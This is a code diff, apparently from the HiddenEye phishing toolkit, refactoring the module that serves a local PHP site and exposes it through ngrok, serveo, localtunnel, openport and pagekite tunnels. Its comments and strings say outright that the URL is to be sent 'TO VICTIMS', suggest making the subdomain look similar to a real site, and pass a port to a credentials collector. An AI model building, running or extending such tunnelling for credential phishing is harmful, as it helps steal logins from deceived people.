@@ -9,20 +9,63 @@
 from Defs.ImportManager.unsorted_will_be_replaced import run_command, run_background_command, wait, ngrok, requests, \
     regular_expression, check_output, CalledProcessError, chdir, chmod, DEVNULL, PIPE, path
 import Defs.ThemeManager.theme as theme
-import Defs.ActionManager.Server.server_menu as server_menu
-import Defs.ActionManager.simple_informant as simple_informant
 import Defs.LocalizationManager.lang_action_manager.lang_server.lang_server_runner as localization
 import Defs.LocalizationManager.lang_global_usage as global_localization
-import Defs.ActionManager.main_runner as main_runner
+from Defs.LocalizationManager.helper import print_sorted_as_menu
 import os
 
-default_palette = theme.default_palette
 try:
     os.mkdir("Server/www")
 except FileExistsError:
     pass
 enter_server_www = chdir("Server/www")
 exit_server_www = chdir("../..")
+
+default_palette = theme.default_palette
+
+
+def server_selection(port):  # Question where user must select server
+    run_command('clear')
+    # print('''
+    #    {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
+    #    |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
+    #    |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
+    #    {0}http://github.com/darksecdevelopers
+    #    {0}** BY:DARKSEC ** \n\n-------------------------------\n
+
+    # )
+    print(global_localization.hidden_eye_logo)
+    print(global_localization.official_website_link)
+    print(global_localization.by_darksec)
+    print(localization.lang_server_selection["server_selection"])
+    print(localization.lang_server_selection["select_any_available_server"])
+    print_sorted_as_menu(localization.lang_server_selection["servers_list"])
+    choice = input(global_localization.input_line)
+    choice = choice.zfill(2)
+    if choice == '00':
+        run_command('clear')
+        start_localhost(port)  # FIXED
+    elif choice == '01':
+        run_command('clear')
+        start_ngrok(port)  # FIXED
+    elif choice == '02':
+        run_command('clear')
+        start_serveo(port)  # ALMOST FIXED
+    elif choice == '03':
+        run_command('clear')
+        start_localxpose(port)  # DOESN'T GET ENTERED CREDENTIALS BACK
+    elif choice == '04':
+        run_command('clear')
+        start_localtunnel(port, True)
+    elif choice == '05':
+        run_command('clear')
+        start_openport(port)
+    elif choice == '06':
+        run_command('clear')
+        start_pagekite(port)
+    else:
+        run_command('clear')
+        return server_selection(port)
 
 
 def set_php(host='127.0.0.1', port=80):
@@ -32,14 +75,17 @@ def set_php(host='127.0.0.1', port=80):
 
 
 def set_port(port=80):
-    run_background_command(["fuser", "-k", "{0}/tcp".format(port)], stdout=DEVNULL, stderr=DEVNULL)
+    run_background_command(
+        ["fuser", "-k", "{0}/tcp".format(port)], stdout=DEVNULL, stderr=DEVNULL)
 
 
 def start_server(port=80):
-    # run_command(["fuser", "-k", "{0}/tcp".format(port), ">", "/dev/null", "2>&1"**/])
+    # run_command(["fuser", "-k", "{0}/tcp".format(port), ">", "/dev/null",
+    # "2>&1"**/])
     set_port(port)
     # enter_server_www
-    # run_command(["php", "-S", "127.0.0.1:{0}".format(port), ">", "/dev/null", "2>&1", "&"])
+    # run_command(["php", "-S", "127.0.0.1:{0}".format(port), ">",
+    # "/dev/null", "2>&1", "&"])
     set_php(port=port)
     # exit_server_www
 
@@ -54,7 +100,10 @@ def start_localhost(port):
     #     {0}** BY:DARKSEC ** \n\n-------------------------------
 
     # '')
-    simple_informant.global_message()
+    print(global_localization.hidden_eye_logo)
+    print(global_localization.official_website_link)
+    print(global_localization.by_darksec)
+    print(global_localization.line_of_dots)
     print(localization.lang_start_localhost["localhost_server"])
     host = "127.0.0.1"
     print(localization.lang_start_localhost["your_localhost_is"] + host)
@@ -63,7 +112,8 @@ def start_localhost(port):
     # && php -S {0}:{1} > /dev/null 2>&1 &".format(host, port))
     enter_server_www
     set_php(host, port)
-    print(localization.lang_start_localhost["starting_server_on_addr"] + "{0}:{1}".format(host, port))
+    print(localization.lang_start_localhost[
+          "starting_server_on_addr"] + "{0}:{1}".format(host, port))
     # wait(2)
     run_command('clear')
     # print('''
@@ -73,18 +123,23 @@ def start_localhost(port):
     #    {0}http://github.com/darksecdevelopers
     #    {0}** BY:DARKSEC ** \n\n-------------------------------
     # ''')
-    simple_informant.global_message()
+    print(global_localization.hidden_eye_logo)
+    print(global_localization.official_website_link)
+    print(global_localization.by_darksec)
+    print(global_localization.line_of_dots)
     print(localization.lang_start_localhost["running_localhost_server"])
 
     # print("-
     # ".format(default_palette[0], default_palette[2], default_palette[3], port, host))
     print(localization.lang_start_localhost["send_this_url_suggestion"])
-    print(localization.lang_start_localhost["localhost_url"] + '{0}:{1}\n'.format(host, port))
+    print(localization.lang_start_localhost[
+          "localhost_url"] + '{0}:{1}\n'.format(host, port))
 
 
 def start_ngrok(port):
     ngrok.DEFAULT_CONFIG_PATH = ".config/ngrok.yml"
-    # ngrok.set_auth_token("<NGROK_AUTH_TOKEN>") # Will be easier to input later
+    # ngrok.set_auth_token("<NGROK_AUTH_TOKEN>") # Will be easier to input
+    # later
     run_command(['killall', '-2', 'ngrok'], stdout=DEVNULL, stderr=DEVNULL)
     run_command('clear')
     # print('''
@@ -94,11 +149,15 @@ def start_ngrok(port):
     #    {0}http://github.com/darksecdevelopers
     #    {0}** BY:DARKSEC ** \n\n-------------------------------
     # ''')
-    simple_informant.global_message()
+    print(global_localization.hidden_eye_logo)
+    print(global_localization.official_website_link)
+    print(global_localization.by_darksec)
+    print(global_localization.line_of_dots)
     print(localization.lang_start_ngrok["ngrok_server"])
     # run_command(['./Server/ngrok http {0}'.format(port)], stdout=DEVNULL, stderr=DEVNULL)
-    ##chmod('Server', 0o777)
-    ##run_command(['Server/ngrok', 'http {0}'.format(port)],stdout=DEVNULL, stderr=DEVNULL)
+    # chmod('Server', 0o777)
+    # run_command(['Server/ngrok', 'http {0}'.format(port)],stdout=DEVNULL,
+    # stderr=DEVNULL)
     ngrok.connect(port=int(port))
     # currentDirectory = os.getcwd() #DELETE
     # print(currentDirectory) #DELETE
@@ -117,8 +176,10 @@ def start_ngrok(port):
             #    default_palette[0], default_palette[2], default_palette[3], port) + url + "{0}".format(default_palette[4]))
             # print("\n")
             print(localization.lang_start_ngrok["send_this_url_suggestion"])
-            print(localization.lang_start_localhost["localhost_url"] + '127.0.0.1:' + port)
-            print(localization.lang_start_ngrok["ngrok_url"] + url + default_palette[4])
+            print(localization.lang_start_localhost[
+                  "localhost_url"] + '127.0.0.1:' + port)
+            print(localization.lang_start_ngrok[
+                  "ngrok_url"] + url + default_palette[4])
             break
 
 
@@ -137,17 +198,23 @@ def start_serveo(port):
         # |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
         # {0}http://github.com/darksecdevelopers
         # {0}** BY:DARKSEC ** \n\n-------------------------------
-        # 
+        #
         # ''')
-        simple_informant.global_message()
+        print(global_localization.hidden_eye_logo)
+        print(global_localization.official_website_link)
+        print(global_localization.by_darksec)
+        print(global_localization.line_of_dots)
         print(localization.lang_start_serveo["serveo_random_server"])
 
-        # run_command('ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:%s serveo.net > link.url 2> /dev/null &' % (port))
+        # run_command('ssh -o StrictHostKeyChecking=no -o
+        # ServerAliveInterval=60 -R 80:localhost:%s serveo.net > link.url 2>
+        # /dev/null &' % (port))
         run_command(['ssh', '-o', 'StrictHostKeyChecking=no', '-o', 'ServerAliveInterval=60', '-R',
                      'localhost:{0}'.format(port), 'serveo.net', '>', 'link.url'], stdout=DEVNULL, stderr=DEVNULL)
         wait(8)
         try:
-            output = check_output("grep -o '.\{0,0\}http.\{0,100\}' link.url", shell=True)
+            output = check_output(
+                "grep -o '.\{0,0\}http.\{0,100\}' link.url", shell=True)
             url = output.decode("utf-8")
             # print("-\n
             # \n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}
@@ -155,8 +222,10 @@ def start_serveo(port):
             # ".format(default_palette[0], default_palette[4], default_palette[3], port) + url + "{0}".format(default_palette[4]))
             # print("\n")
             print(localization.lang_start_serveo["send_this_url_suggestion"])
-            print(localization.lang_start_localhost["localhost_url"] + '127.0.0.1:' + port)
-            print(localization.lang_start_serveo["serveo_url"] + url + default_palette[4])
+            print(localization.lang_start_localhost[
+                  "localhost_url"] + '127.0.0.1:' + port)
+            print(localization.lang_start_serveo[
+                  "serveo_url"] + url + default_palette[4])
         except CalledProcessError:
 
             wait(4)
@@ -164,7 +233,6 @@ def start_serveo(port):
             return random(port)
 
     def custom(port):
-
         # print('''
         # {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
         # |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
@@ -176,9 +244,13 @@ def start_serveo(port):
 
         # \n
         # \n{0}Insert a custom subdomain for serveo'''.format(default_palette[0], default_palette[2]))
-        simple_informant.global_message()
+        print(global_localization.hidden_eye_logo)
+        print(global_localization.official_website_link)
+        print(global_localization.by_darksec)
+        print(global_localization.line_of_dots)
         print(localization.lang_start_serveo["serveo_custom_server"])
-        print(localization.lang_start_serveo["make_url_simmilar_to_real_suggestion"])
+        print(localization.lang_start_serveo[
+              "make_url_simmilar_to_real_suggestion"])
         print(localization.lang_start_serveo["insert_custom_subdomain"])
 
         lnk = input(global_localization.input_line)
@@ -186,14 +258,18 @@ def start_serveo(port):
             lnk += ".serveo.net"
         else:
             pass
-        # run_command('ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=60 -R %s:80:localhost:%s serveo.net > link.url 2> /dev/null &' % (lnk, port))
+        # run_command('ssh -o StrictHostKeyChecking=no -o
+        # ServerAliveInterval=60 -o ServerAliveCountMax=60 -R
+        # %s:80:localhost:%s serveo.net > link.url 2> /dev/null &' % (lnk,
+        # port))
         run_command(
             ['ssh', '-o', 'StrictHostKeyChecking=no', '-o', 'ServerAliveInterval=60', '-o', 'ServerAliveCountMax=60',
              '-R', '{0}:80:localhost:{1}'.format(lnk, port), 'serveo.net', '>', 'link.url'], stdout=DEVNULL,
             stderr=DEVNULL)
         wait(7)
         try:
-            output = check_output("grep -o '.\{0,0\}http.\{0,100\}' link.url", shell=True)
+            output = check_output(
+                "grep -o '.\{0,0\}http.\{0,100\}' link.url", shell=True)
             url = output.decode("utf-8")
             run_command('clear')
             # print('''
@@ -203,15 +279,20 @@ def start_serveo(port):
             # {0}http://github.com/darksecdevelopers
             # {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ CUSTOM SERVEO URL ]{1}!! {0}
             # \n-------------------------------'''.format(default_palette[0], default_palette[2]))
-            simple_informant.global_message()
+            print(global_localization.hidden_eye_logo)
+            print(global_localization.official_website_link)
+            print(global_localization.by_darksec)
+            print(global_localization.line_of_dots)
             print(localization.lang_start_serveo["serveo_custom_server"])
 
             # print("\n{0}[{1}!{0}]{1} SEND THIS SERVEO URL TO VICTIMS-
             # \n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}
             # \n{0}[{1}*{0}]{1} SERVEO URL: {2}".format(default_palette[0], default_palette[2], default_palette[3], port) + url + "{0}".format(default_palette[4]))
             print(localization.lang_start_serveo["send_this_url_suggestion"])
-            print(localization.lang_start_localhost["localhost_url"] + '127.0.0.1:' + port)
-            print(localization.lang_start_serveo["serveo_url"] + url + default_palette[4])
+            print(localization.lang_start_localhost[
+                  "localhost_url"] + '127.0.0.1:' + port)
+            print(localization.lang_start_serveo[
+                  "serveo_url"] + url + default_palette[4])
 
             print("\n")
 
@@ -237,13 +318,16 @@ def start_serveo(port):
         #
         #
         #  '''.format(default_palette[0], default_palette[2]))
-        simple_informant.global_message()
+        print(global_localization.hidden_eye_logo)
+        print(global_localization.official_website_link)
+        print(global_localization.by_darksec)
+        print(global_localization.line_of_dots)
         print(localization.lang_start_serveo["serveo_url_option_selection"])
         print(localization.lang_start_serveo["serveo_phishing_warning"])
         print(localization.lang_start_serveo["choose_type_of_url"])
 
         # print(" \n".format(default_palette[0], default_palette[2]))
-        main_runner.print_sorted_as_menu(localization.lang_start_serveo["url_types"])
+        print_sorted_as_menu(localization.lang_start_serveo["url_types"])
         choice = input(global_localization.input_line)
         run_command('clear')
         if choice == '1':
@@ -260,7 +344,7 @@ def start_serveo(port):
         choice = input("HiddenEye >> ")
         choice = choice.lower()
         if choice == 'y':
-            return server_menu.server_selection(port)
+            return server_selection(port)
         else:
             return start_serveo(port)
 
@@ -424,7 +508,7 @@ def start_openport(port):
                 print('{0}[{1}!{0}] {1}Openport Error:\n\n{2}'.format(default_palette[0], default_palette[4], output))
                 input('\n\n{0}[{1}*{0}] {1}Try Other Tunnels... (Press Enter)'.format(default_palette[0],
                                                                                       default_palette[4]))
-                server_menu.server_selection(port)
+                server_selection(port)
 
         urlFile = open('openport.txt', 'r')
         urltoverify = urlFile.read().strip()
@@ -459,12 +543,13 @@ def start_openport(port):
         print('[*] Openport not Installed correctly, Try installing it manually !!')
         print('[*] Check Here ... https://openport.io/download')
         input('\n Press Enter To Go back..')
-        server_menu.server_selection(port)
+        server_selection(port)
     else:
         manage_url(port)
 
 
 def start_pagekite(port):
+    from Defs.ActionManager.simple_informant import credentials_collector
     run_command('clear')
     print('''
 		{1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
@@ -482,7 +567,7 @@ def start_pagekite(port):
             print("\n{0}[{1}*{0}] {1}FAILED TO INSTALL PYTHON2 (TRY MANUALLY)..{1}".format(default_palette[0],
                                                                                            default_palette[4]))
             wait(2)
-            server_menu.server_selection(port)
+            server_selection(port)
         else:
             pass
     else:
@@ -505,4 +590,4 @@ def start_pagekite(port):
             run_command('python2 Server/pagekite.py --clean --signup {0} {1}.pagekite.me'.format(port, subdomain))
         except KeyboardInterrupt:
             print('[!] Please Copy the Generated Link For Further Use')
-            simple_informant.credentials_collector(port)
+            credentials_collector(port)
